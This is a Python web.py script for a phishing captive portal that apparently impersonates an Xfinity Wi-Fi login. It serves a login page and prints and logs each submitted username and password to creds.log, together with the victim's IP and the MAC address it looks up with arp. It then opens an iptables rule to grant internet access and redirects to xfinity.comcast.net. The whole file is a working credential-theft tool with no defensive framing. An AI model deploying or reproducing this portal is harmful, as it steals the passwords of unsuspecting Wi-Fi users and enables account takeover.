import web
import os
import re
from subprocess import Popen, PIPE
from datetime import datetime


urls = (
  '/login', 'login',
  '/(.*)', 'index'
)

index_page = open("index.html")
index_content = index_page.read()
index_page.close()


class index:
    def GET(self, *args):
        return index_content


class login:
    def POST(self, *args):
        data = web.input()
        username = data.username
        password = data.password
        # check if username/password are valid
        if "@" not in username or len(password) == 0:
            return web.seeother('/')
        print("Creds Captured!")
        print("Username: " + username)
        print("Password: " + password)
        # get identifying information
        ip = str(web.ctx['ip'])
        pid = Popen(["arp", "-n", ip], stdout=PIPE)
        s = pid.communicate()[0]
        mac = re.search(r"(([a-f\d]{1,2}\:){5}[a-f\d]{1,2})", s).groups()[0]
        # write to log
        creds = open("creds.log", "a")
        creds.write(datetime.now().isoformat() + "\n")
        creds.write("IP: " + ip + "\n")
        creds.write("MAC: " + mac + "\n")
        creds.write("Username: " + username + "\n")
        creds.write("Password: " + password + "\n")
        creds.write("---------------------------\n")
        creds.close()
        # allow internet access
        os.system("iptables -t nat -I PREROUTING -m mac --mac-source " + mac + " -j ACCEPT")
        return web.redirect("http://xfinity.comcast.net")


if __name__ == "__main__":
    app = web.application(urls, globals())
    app.run()
